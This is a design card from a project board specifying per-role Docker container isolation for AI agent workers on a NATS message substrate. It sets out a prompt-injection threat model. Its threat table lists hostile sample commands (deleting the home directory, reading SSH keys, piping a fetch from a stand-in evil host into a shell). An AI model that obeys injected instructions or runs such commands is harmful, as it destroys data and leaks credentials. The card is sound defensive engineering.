---
column: Backlog
created: 2026-04-26
order: 214
---

# Card 214 — Worker isolation: each role runs in its own Docker container (MVP)

## Why

Workers consume content from untrusted-ish sources:
- runtime task cards in `~/team-alpha-board/` (operator-authored, but
  could be auto-generated from Jira / GH issues / external pipelines
  later);
- `a2a_emit_message` chunks from peer agents (poisoned peers);
- `agents.<role>.inbox` DMs from any role on the substrate;
- file references in card payloads (worker reads them directly).

Any of these can carry prompt injection. Without isolation, a
malicious card or DM can drive a worker into:

- writing to arbitrary host paths,
- exfiltrating creds via `Read` on `~/.ssh/`, `~/.aws/`, etc.,
- arbitrary `Bash` execution including `curl | sh`,
- mutating the `.tasks/` board for other roles,
- stamping false `a2a_update_status` events.

Containers cap blast radius: even a fully compromised worker can
only touch its workspace + the NATS substrate (where ACLs already
enforce role-level permissions).

This is **MVP-blocking** — once external task cards are in scope
(card 213), unisolated workers become a real risk.

## Spec

### One container per worker role

Image: `team-alpha-worker:<sha>` — minimal Debian slim with:
- `claude` CLI installed
- `nats` CLI
- `git`
- `python3` + `mcp-server` venv (for team-alpha MCP)
- `board-tui-mcp` (read+write its own workspace cards only)
- Plus role-specific tooling per skill set:
  - priya: terraform, awscli
  - raj: python, language-tools
  - lin: python, node, typescript
  - sam: python, node (UI)
  - diego: go, terraform (light)

Per-container env:
- `TEAM_ALPHA_ROLE=<role>`
- `TEAM_ALPHA_NATS_URL=nats://host.docker.internal:4222` (or service-net hostname)
- `TEAM_ALPHA_CREDS=/run/secrets/role-password`

### Mounts (whitelist)

Read-only:
- `/Users/mid/.team-alpha/<role>.password` → `/run/secrets/role-password:ro`
- `/Users/mid/Repos/ai-over-nats/scripts/agent-prompts/<role>.md` → `/etc/team-alpha/role-prompt.md:ro`
- `/Users/mid/Repos/ai-over-nats/MODEL.md` → `/etc/team-alpha/MODEL.md:ro`

Read-write (worker workspace only):
- `~/team-alpha-board-<role>/` → `/work/board:rw` (per-role view of
  the board, NOT the whole board — see "Board access" below)
- `~/team-alpha-workspaces/<role>/` → `/work/workspace:rw` (where
  worker writes artifacts: `*.tf`, `*.py`, etc.)

DENIED (no mount):
- host home, `~/.ssh`, `~/.aws`, `~/.claude`, source repos other
  than what's strictly needed.

### Network

- NATS reachable via `host.docker.internal:4222` (Mac) or
  `nats:4222` on a docker-compose network.
- No outbound internet by default. Worker requires explicit
  per-task egress allowlist (terraform fetch from registry, pip
  install) → use a proxy container with allowlist, or Docker
  network policy.

### Board access split

Workers must NOT see other roles' inboxes / cards-in-progress.
Each role gets its own board view via either:

- **Option A — physical split**: `~/team-alpha-board-<role>/`
  per role, mounted into the worker. Maya (dispatcher) holds the
  master at `~/team-alpha-board/` and copies/symlinks
  per-role cards on dispatch.
- **Option B — board-tui server-side filter**: single board, but
  board-tui-mcp gains a `--role` flag that filters list/get to
  cards where `claimed_by == <role>` or `target == <role>`.

Recommend B (less filesystem juggling). Adds a small patch to
board-tui-mcp.

### Container lifecycle

- `docker compose up <role>` starts a long-running container that
  runs `claude` interactively (or in headless / agentic mode via
  Claude Agent SDK in v2).
- Container restart on host reboot. Healthcheck: NATS handshake
  publish.
- Logs to `~/team-alpha-logs/<role>.log` (host-mounted).

### Maya stays on host (P1) → moves to container (P2)

P1: maya in host claude session (low risk — doesn't read
external content directly, only operator prompts + MCP tools).
P2: maya also in container, identical pattern. Defers to keep MVP
small.

## Files

- `infra/worker-image/Dockerfile` — base image
- `infra/worker-image/Dockerfile.<role>` — per-role overlays w/
  skill tooling
- `infra/docker-compose.workers.yml` — one service per worker
- `infra/worker-image/build.sh` — sha-tagged build script
- `scripts/team-alpha-spawn.sh` — `team-alpha-spawn priya` —
  ergonomic wrapper for `docker compose run priya claude`
- `mcp-server/.../board_tui_role_filter.py` (or upstream patch
  to board-tui-mcp) — `--role` filter
- `scripts/agent-prompts/<role>.md` × 5 — note container-only
  filesystem (e.g. /work/workspace as cwd)
- `.tasks/team-alpha-worker-containers.md` — this card

## Acceptance

- [ ] `docker compose -f infra/docker-compose.workers.yml up priya`
      starts a container running `claude` connected to NATS.
- [ ] From host, dispatching `tb-vpc-peering-staging` via A2A
      lands in the priya container; she reads `/work/board/<slug>.md`,
      writes the artifact to `/work/workspace/<slug>/`, completes.
- [ ] Container cannot read `/Users/mid/.ssh` (mount absent).
- [ ] Container cannot publish to `agents.raj.events` etc. (NATS
      ACL enforces role).
- [ ] Killing the container during a task → maya's Monitor sees
      `state.alert.no_human` for priya within 30s; cancel signal
      published; KV inflight cleared on restart.
- [ ] Cold restart preserves no in-memory secrets — every secret
      is re-mounted from host.
- [ ] Image rebuild < 90s incremental; full < 5min.

## Threat model deltas vs. host-mode

| Threat                                         | Host (today) | Container (this card) |
|------------------------------------------------|--------------|------------------------|
| Prompt-injected `Bash` runs `rm -rf ~/`        | Catastrophic | Limited to `/work/`   |
| Prompt-injected `Read ~/.ssh/id_rsa`           | Compromised  | File absent           |
| Prompt-injected `curl evil.example/* | sh`     | Compromised  | Egress denied         |
| Prompt-injected NATS publish to other role    | Already ACL-blocked | Same |
| Worker bug → stuck process                     | Kills tab    | `docker rm -f`         |
| Container breakout (kernel exploit)            | n/a          | Risk; mitigate w/ `--security-opt`, no `--privileged`, dropped caps |

## Out of scope

- gVisor / Kata sandboxing (P3). Standard runc is enough for MVP.
- Multi-host orchestration (k8s, swarm). Single-host docker is
  fine for team-alpha simulation.
- Maya in container (P2 — see above).
- Capability-by-task egress allowlist (P2).
- Persistent worker memory across restarts (P3 — for now,
  workspace mount + NATS state is the "memory").

## Refs

- Card 213 — runtime task board (introduces external content path).
- Card 60, 210, 211, 212 — hooks + Monitor + reinforcement; all
  must work inside the container.
- ADR (TBD) — formalize the threat model + isolation choices.
- MODEL.md — substrate ACLs already enforce role-level NATS
  permissions; container is the missing host-side isolation.
